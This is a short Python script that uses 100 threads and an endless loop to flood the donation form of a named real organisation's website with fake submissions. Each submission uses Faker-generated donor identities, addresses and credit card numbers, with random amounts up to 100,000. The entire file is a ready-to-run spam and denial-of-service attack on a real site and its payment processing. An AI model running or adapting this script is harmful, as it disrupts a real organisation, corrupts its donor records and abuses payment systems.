import requests
import random
import threading
from faker import Faker

fake = Faker()

url = 'https://www.texasrighttolife.com/donate/'
postcode_list = range(73301, 88595, 1)

def do_request():
    try:
        while True:
            amountgroup = 'other'
            org = 'pac'
            amount = random.randint(1, 100000)
            firstname = fake.first_name()
            lastname = fake.last_name()
            street_address = fake.street_address()
            city = fake.city()
            state = 'TX'
            zipcode = random.choice(postcode_list)
            email = fake.email()
            phone = fake.phone_number()
            phtype = 'Home'
            occ = fake.job()
            comp = fake.company()
            dtype = 'One-Time Gift'
            ccnum = fake.credit_card_number(card_type=None)
            defaultexpmonth = fake.credit_card_expire(start="now", end="+10y", date_format="%m")
            defaultexpyear = random.randint(22, 27)
            step = 5
            min = 10
            
            requests.post(
                url,
                allow_redirects=False,
                data = {
                    'AmountGroup': amountgroup,
                    'oamount': amount,
                    'org': org,
                    'fname': firstname,
                    'lname': lastname,
                    'addr_line1': street_address,
                    'addr_city': city,
                    'addr_state': state,
                    'addr_zip': zipcode,
                    'email': email,
                    'phone': phone,
                    'phone_type': phtype,
                    'occupation': occ,
                    'employer': comp,
                    'dtype': dtype,
                    'cardfname': firstname,
                    'cardlname': lastname,
                    'ccnumber': ccnum,
                    'expmonth': defaultexpmonth,
                    'expyear': defaultexpyear,
                    'step': step,
                    'min': min
                }
            )
            print('Posting:', firstname, lastname, street_address, city, state, zipcode, amount, ccnum)
    except:
        pass

threads = []

for i in range(100):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range(100):
    threads[i].start()
    
for i in range(100):
    threads[i].join()
